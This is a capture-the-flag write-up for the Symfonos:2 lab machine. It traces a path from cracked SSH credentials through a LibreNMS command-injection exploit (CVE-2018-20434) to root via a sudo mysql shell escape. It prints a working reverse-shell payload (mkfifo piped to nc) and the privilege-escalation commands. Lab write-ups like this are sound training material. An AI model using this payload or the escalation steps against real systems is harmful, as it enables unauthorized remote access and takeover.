# Symfonos-2-Writeup

🧠 Overview

Machine: Symfonos:2
Difficulty: Intermediate
Goal: Gain root access
Attack Chain:
aeolus → LibreNMS RCE → cronus → sudo mysql → root

1️⃣ Enumeration
Nmap Scan

Initial scan revealed:

SSH (22)

HTTP (80)

After gaining initial credentials (cracked hash for user aeolus), SSH access was obtained.

2️⃣ Initial Access – aeolus

Password cracked:

aeolus : sergioteamo

SSH login successful:

ssh aeolus@target
3️⃣ Local Enumeration

Checked:

sudo -l → no sudo

SUID binaries → nothing useful

Cron jobs → nothing writable

Capabilities → nothing exploitable

Then checked listening services:

curl http://127.0.0.1:8080

Discovered internal web application:

LibreNMS login page
4️⃣ Internal Service Exploitation – LibreNMS

The internal service was identified as:

LibreNMS
Version: ~2018 build

Research revealed vulnerability:

CVE-2018-20434
Authenticated command injection via Add Host feature.

Exploit Used

The exploit abused the SNMP community parameter:

payload = "'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc RHOST RPORT >/tmp/f) #"

Steps:

Login to LibreNMS

Capture session cookies

Run exploit

Trigger /ajax_output.php

Receive reverse shell

Listener:

nc -lvnp 4444

Shell received as:

librenms
5️⃣ Pivot to cronus

After exploitation, the shell landed in:

/opt/librenms/html

Further enumeration revealed access to:

/home/cronus

Shell context changed to:

cronus
6️⃣ Privilege Escalation

Checked sudo permissions:

sudo -l

Output:

User cronus may run the following commands:
    (root) NOPASSWD: /usr/bin/mysql

This is a classic GTFOBins escalation vector.

Exploitation
sudo mysql
\! /bin/bash

Root shell obtained.

Verification:

whoami
root

Accessed:

/root/proof.txt

Machine successfully rooted.

🏁 Final Exploitation Chain
aeolus (SSH access)
    ↓
Internal LibreNMS discovery
    ↓
CVE-2018-20434 RCE
    ↓
librenms shell
    ↓
cronus user
    ↓
sudo mysql
    ↓
root
